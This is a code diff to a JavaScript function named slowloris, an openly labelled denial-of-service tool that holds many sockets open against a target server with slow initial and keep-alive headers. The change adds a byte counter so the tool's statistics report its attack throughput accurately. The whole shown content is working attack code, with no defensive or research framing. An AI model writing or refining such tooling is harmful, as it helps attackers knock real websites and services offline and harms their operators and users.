@@ -22,6 +22,7 @@ function slowloris(target, numSockets, statsCallback) {
         let startTime = Date.now();
         let targetStatus = "Unknown";
         let mbps = 0;
+        let bytesSent = 0;
 
         console.log(`Slowloris attack on ${hostname}:${port} using ${numSockets} sockets.`);
 
@@ -31,7 +32,7 @@ function slowloris(target, numSockets, statsCallback) {
 
         function updateStats() {
             let elapsedTime = (Date.now() - startTime) / 1000;
-            mbps = elapsedTime > 0 ? (packetsSent * 1000 / elapsedTime) / 1000000 : 0;
+            mbps = elapsedTime > 0 ? (bytesSent / elapsedTime) / 1000000 : 0;
 
             if (statsCallback) {
                 statsCallback({
@@ -93,6 +94,7 @@ function slowloris(target, numSockets, statsCallback) {
             try {
                 socket.send(initialHeader);
                 packetsSent++;
+                bytesSent += initialHeader.length;
             } catch (error) {
                 console.error("Error sending initial header:", error.message);
                 closeSocket(socket);
@@ -104,6 +106,7 @@ function slowloris(target, numSockets, statsCallback) {
             try {
                 socket.send(keepAliveHeader);
                 packetsSent++;
+                 bytesSent += keepAliveHeader.length;
             } catch (error) {
                 console.error("Error sending keep-alive header:", error.message);
                 closeSocket(socket);
